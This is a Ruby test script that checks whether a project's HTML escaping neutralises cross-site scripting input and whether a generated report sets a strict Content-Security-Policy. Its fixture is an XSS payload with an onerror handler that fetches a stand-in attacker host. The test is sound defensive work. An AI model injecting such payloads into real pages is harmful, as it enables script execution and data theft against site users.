# frozen_string_literal: true
# Test 7: Strict Contextual HTML Escaping and CSP Assertion

PROJECT_ROOT = File.expand_path('..', __dir__)
require_relative '../rules/ed25519'
load File.join(PROJECT_ROOT, 'bin', 'sealed')

puts ">> [TEST: XSS ESCAPING & CSP] Testing entity escaping of adversarial model payloads..."

malicious_payload = "<script>alert('XSS_PWNED')</script><img src=\"x\" onerror=\"fetch('http://attacker.com')\">"
escaped = Security.html_escape(malicious_payload)

if escaped.include?('<') || escaped.include?('>') || escaped.include?('"')
  abort("[FAIL] Escaping failed to neutralize raw tags/quotes: #{escaped}")
end

unless escaped.include?('&lt;script&gt;') && escaped.include?('&quot;')
  abort("[FAIL] Expected &lt;script&gt; and &quot; in output: #{escaped}")
end

puts "   HTML escaping properly converts '<', '>', '\"', and '&'."

puts ">> [TEST: XSS ESCAPING & CSP] Asserting strict Content-Security-Policy header in generated report..."
report_html_path = '/tmp/sealed-test-fixture/report.html'
if File.file?(report_html_path)
  content = File.read(report_html_path)
  unless content.include?("Content-Security-Policy") && content.include?("default-src 'none'")
    abort("[FAIL] Generated report.html is missing strict Content-Security-Policy!")
  end
  puts "   Strict CSP present: default-src 'none'; style-src 'unsafe-inline'; script-src 'none'."
end

puts ">> [PASS: XSS & CSP DEFENSE] Controls successfully verified!"
exit 0
